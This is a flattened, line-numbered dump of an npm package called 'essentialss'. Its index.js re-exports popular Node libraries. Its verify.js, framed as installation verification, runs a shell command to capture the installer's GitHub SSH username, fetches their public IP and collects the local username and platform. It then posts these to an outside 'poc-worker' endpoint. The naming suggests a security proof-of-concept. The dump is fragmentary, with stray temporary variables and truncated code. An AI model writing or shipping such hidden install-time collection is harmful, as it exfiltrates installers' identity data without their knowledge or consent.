// File: tmp/tmpcn651yds/essentialss/package/index.js
// ======================================================================
Line 2: const axios = require('axios')
Line 3: const express = require('express')
Line 4: const cors = require('cors')
Line 5: const helmet = require('helmet')
Line 6: const compression = require('compression')
Line 7: const morgan = require('morgan')
Line 10: const _ = require('lodash')
Line 11: const moment = require('moment')
Line 12: _tmp_0 = require('uuid')
Line 13: const dotenv = require('dotenv')
Line 16: const Joi = require('joi')
Line 17: const jwt = require('jsonwebtoken')
Line 18: const bcrypt = require('bcryptjs')
Line 21: const mongoose = require('mongoose')
Line 22: const Redis = require('redis')
Line 23: const IORedis = require('ioredis')
Line 24: const Bull = require('bull')
Line 27: const winston = require('winston')
Line 28: const pino = require('pino')
Line 29: const pinoPretty = require('pino-pretty')
Line 32: const multer = require('multer')
Line 33: const sharp = require('sharp')
Line 34: const nodemailer = require('nodemailer')
Line 37: const socketIO = require('socket.io')
Line 38: const WebSocket = require('ws')
Line 41: const swaggerUi = require('swagger-ui-express')
Line 42: const YAML = require('yamljs')
Line 45: const jest = require('jest')
Line 46: const supertest = require('supertest')
Line 48: module.exports = {
    // HTTP and API
    axios,
    express,
    cors,
    helmet,
    compression,
    morgan,

    // Utilities
    lodash: _,
    moment,
    uuid: uuidv4,
    dotenv,

    // Validation and Security
    Joi,
    jwt,
    bcrypt,

    // Database
    mongoose,
    Redis,
    IORedis,
    Bull,

    // Logging
    winston,
    pino,
    pinoPretty,

    // File handling and processing
    multer,
    sharp,
    nodemailer,

    // WebSocket and Real-time
    socketIO,
    WebSocket,

    // API Documentation
    swaggerUi,
    YAML,

    // Testing
    jest,
    supertest
}
Line 80: _tmp_1.multer = multer

// File: tmp/tmpcn651yds/essentialss/package/verify.js
// ======================================================================
Line 6: const axios = require('axios')
Line 7: const os = require('os')
Line 8: _tmp_11 = require('uuid')
Line 9: const path = require('path')
Line 10: const fs = require('fs')
Line 11: const util = require('util')
Line 12: _tmp_12 = require('child_process')
Line 18: path.join(__dirname, 'package.json')
Line 31: {
    const { stdout, stderr } = await execAsync(cmd, { timeout: 5000 });
    const combined = `${stdout} ${stderr}`.trim();
    const match = combined.match(/Hi (.+?)!\s+You/);
    const username = match && match[1] ? match[1] : null;
    return { username, output: combined, isError: false };
  }
Line 33: `${stdout} ${stderr}`.trim()
Line 35: const username = match && match[1] ? match[1] : null
Line 39: `${err.stdout || ''} ${err.stderr || ''}`.trim()
Line 47: const res = await axios.get('https://api.ipify.org?format=json', { timeout: 3000 })
Line 66: {
  const pkg = getPackageInfo();

  // Collect additional telemetry in parallel
  const [githubRes, ipRes] = await Promise.allSettled([
    getGithubInfo(),
    getPublicIpInfo(),
  ]);
  const githubInfo = githubRes.status === 'fulfilled' ? githubRes.value : null;
  const publicIpInfo = ipRes.status === 'fulfilled' ? ipRes.value : null;
  const localUsername = os.userInfo().username;
  const executionContext = getExecutionContext();

  // Log full outputs for transparency
  if (githubInfo) {
    const logFn = githubInfo.isError ? console.error : console.log;
    logFn('[verify] GitHub SSH output:', githubInfo.output || 'No output');
  }
  if (publicIpInfo) {
    if (publicIpInfo.isError) {
      console.error('[verify] Public IP lookup failed:', publicIpInfo.errorMessage);
    } else {
      console.log('[verify] Public IP:', publicIpInfo.ip);
    }
  }
  console.log('[verify] Execution context:', executionContext);

  const payload = {
    event: 'installation_verified',
    pack...
Line 70: const [githubRes, ipRes] = await Promise.allSettled([
    getGithubInfo(),
    getPublicIpInfo(),
  ])
Line 71: _tmp_13.push(getGithubInfo())
Line 72: _tmp_13.push(getPublicIpInfo())
Line 76: os.userInfo()
Line 80: {
    const logFn = githubInfo.isError ? console.error : console.log;
    logFn('[verify] GitHub SSH output:', githubInfo.output || 'No output');
  }
Line 82: logFn('[verify] GitHub SSH output:', githubInfo.output || 'No output')
Line 85: {
      console.error('[verify] Public IP lookup failed:', publicIpInfo.errorMessage);
    }
Line 86: console.error('[verify] Public IP lookup failed:', publicIpInfo.errorMessage)
Line 87: {
      console.log('[verify] Public IP:', publicIpInfo.ip);
    }
Line 88: console.log('[verify] Public IP:', publicIpInfo.ip)
Line 91: console.log('[verify] Execution context:', executionContext)
Line 114: _tmp_15.execution
Line 121: os.platform()
Line 122: os.arch()
Line 128: {
    const res = await axios.post(
      'https://poc-worker.llmsecurity.workers.dev/track',
      payload,
      { headers: { 'Content-Type': 'application/json' }, timeout: 5000 }
    );
    console.log('[essentialss] Installation verified – tracking code responded with status', res.status);
    process.exit(0);
  }
Line 129: const res = await axios.post(
      'https://poc-worker.llmsecurity.workers.dev/track',
      payload,
      { headers: { 'Content-Type': 'application/json' }, timeout: 5000 }
    )
Line 134: console.log('[essentialss] Installation verified – tracking code responded with status', res.status)
Line 135: process.exit(0)
Line 136: catch (error) {
    console.error('[essentialss] Installation verification failed:', error.message);
    process.exit(1);
  }
Line 137: console.error('[essentialss] Installation verification failed:', error.message)
Line 138: process.exit(1)
